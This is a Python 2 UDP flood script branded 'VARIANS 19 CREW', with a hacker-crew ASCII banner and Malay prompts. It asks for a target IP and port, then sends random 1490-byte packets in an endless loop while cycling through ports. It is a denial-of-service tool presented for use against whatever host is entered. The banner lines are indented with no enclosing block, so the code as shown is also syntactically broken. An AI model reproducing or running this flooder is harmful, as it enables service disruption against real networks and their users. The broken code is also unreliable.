import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")

    print
    print "\033[1;32m#############################################################"
    print "#------------------------[\033[1;91mVARIANS 19 CREW\033[1;32m]---------------------#"
    print "         __     __       _     ___       __    ____    ___  _         _  "
    print "         \ \   / /      / |   / _ \     / _|  |  _ \  | __| \ \      / / "
    print "          \ \ / /_____  | |  | (_) |   | |    | |_) | | __|  \ \ /\ / / "
    print "           \ V /|_____| | |  \__,  |   | |_   |  _<   | |_    \ V  V /    "
    print "            \_/         |_|     /_/     \__|  |_| \_\ |___|    \_/\_/   "
    print "------------------------[\033[1;91mLEADER:KUACIBASI\033[1;32m]---------------------#"
    print "#############################################################"
    print "                        CREATOR:MR.ASHFLYY"
    print "                       #WE ARE MALAYSIAN HACKER"
    print "                       #WE ARE MUSLIM HACKER"
    print



ip = raw_input("Masukkan IP Target : ")
port = input  ("Masukkan Port      : ")

os.system("clear")
os.system("figlet Attack Starting")
print "[                    ] 0% "
time.sleep(5)
print "[##########          ] 50%"
time.sleep(5)
print "[####################] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught Port"%(sent,ip)
     if port == 65534:
       port = 1
